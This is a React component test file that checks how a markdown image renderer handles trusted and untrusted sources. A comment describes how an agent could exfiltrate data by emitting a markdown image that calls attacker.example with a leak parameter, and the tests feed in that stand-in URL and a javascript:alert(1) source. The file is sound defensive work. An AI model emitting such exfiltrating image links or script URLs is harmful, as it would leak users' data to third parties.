// @vitest-environment jsdom

import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import { API_URL } from "../lib/api-client";
import { MarkdownImage } from "./markdown-image";

afterEach(cleanup);

describe("MarkdownImage", () => {
  it("renders a trusted image inline", () => {
    render(<MarkdownImage src={`${API_URL}/downloads/tok`} alt="chart" />);

    const img = screen.getByRole("img", { name: "chart" });
    expect(img.getAttribute("src")).toBe(`${API_URL}/downloads/tok`);
    expect(screen.queryByRole("link")).toBeNull();
  });

  it("renders an untrusted image as a click-through link, never an <img>", () => {
    // An agent that emits ![](https://attacker.example/?leak=…) would exfiltrate
    // on render if this fetched. It must stay a link the user has to click.
    render(<MarkdownImage src="https://attacker.example/pixel.png" alt="ignore me" />);

    const link = screen.getByRole("link");
    expect(link.getAttribute("href")).toBe("https://attacker.example/pixel.png");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link.textContent).toContain("attacker.example");
    expect(screen.queryByRole("img")).toBeNull();
  });

  it("renders a non-HTTP(S) image source as text, never a link", () => {
    render(<MarkdownImage src="data:image/png;base64,AAAA" alt="inline" />);

    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.queryByRole("img")).toBeNull();
    expect(screen.getByText("[External image: inline (unknown host)]")).toBeTruthy();
  });

  it("renders a javascript: image source as text, never a link", () => {
    render(<MarkdownImage src="javascript:alert(1)" alt="x" />);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("[External image: x (unknown host)]")).toBeTruthy();
  });

  it("renders nothing without a usable src", () => {
    const { container } = render(<MarkdownImage src="" alt="empty" />);
    expect(container.innerHTML).toBe("");
  });
});
